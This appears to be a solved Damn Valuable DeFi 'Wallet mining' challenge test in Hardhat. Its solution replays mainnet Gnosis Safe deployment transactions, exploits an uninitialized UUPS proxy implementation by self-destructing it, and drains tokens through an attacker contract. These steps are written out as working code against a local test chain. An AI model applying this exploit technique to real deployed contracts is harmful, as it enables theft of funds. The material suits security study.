const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // case study: https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY

        // official Gnosis Safe factory was deployed by EOA account 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A (ref: https://etherscan.io/address/0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
        const safeDployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        // fund acct for deployment
        await player.sendTransaction({
            from: player.address,
            to: safeDployer,
            value: ethers.utils.parseEther("1"),
        });
        
        const {masterCopyTx, setImplementationTx, factTx} = require('./transactionData');
        // 1. we have to recreate the contracts deployed in the mainnet up until factory (i.e. the first three transaction of the deplyer acct: https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a)
        // 1st transaction of safe deployer: https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3 (ref: https://etherscan.io/address/0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F)
        const masterCopy = await (await ethers.provider.sendTransaction(masterCopyTx)).wait();
        console.log("master copy recreated", masterCopy.contractAddress);
        // 2nd transaction of safe deployer: https://etherscan.io/getRawTx?tx=0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4
        await (await ethers.provider.sendTransaction(setImplementationTx)).wait();
        console.log("setImplementation(string contractName, address implementation) is called");
        // 3rd the deplyment transaction is here https://etherscan.io/getRawTx?tx=0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261 (ref: https://etherscan.io/address/0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
        const safeFactory = await (await ethers.provider.sendTransaction(factTx)).wait();
        console.log("factory recreated at", safeFactory.contractAddress);


        // case ref: https://medium.com/immunefi/wormhole-uninitialized-proxy-bugfix-review-90250c41a43a
        // IMPLEMENTATION_SLOT is extracted from ERC1967UpgradeUpgradeable (@openzeppelin/contracts-upgradeable/proxy/ERC1967/ERC1967UpgradeUpgradeable.sol)
        const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        const implementationSlotValue = await ethers.provider.getStorageAt(
            authorizer.address, 
            IMPLEMENTATION_SLOT
        );
        const implementationAddress = ethers.utils.getAddress(
            "0x" + implementationSlotValue.slice(-40).toString("hex")
        );
        const authorizerImplmentation = await ethers.getContractAt(
            "AuthorizerUpgradeable", 
            implementationAddress 
        );
        await authorizerImplmentation.connect(player).init([], []); // step #1
        let terminator = await (await ethers.getContractFactory('SelfDestruct', player)).deploy(); // step #2 of case ref
        let calldata = terminator.interface.encodeFunctionData("terminate", [player.address]); 
        await authorizerImplmentation.connect(player).upgradeToAndCall(terminator.address, calldata); // step #3, #4. #5, #6 of case ref
   
        const attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy();
        await attacker.connect(player).attack(walletDeployer.address, DEPOSIT_ADDRESS, player.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
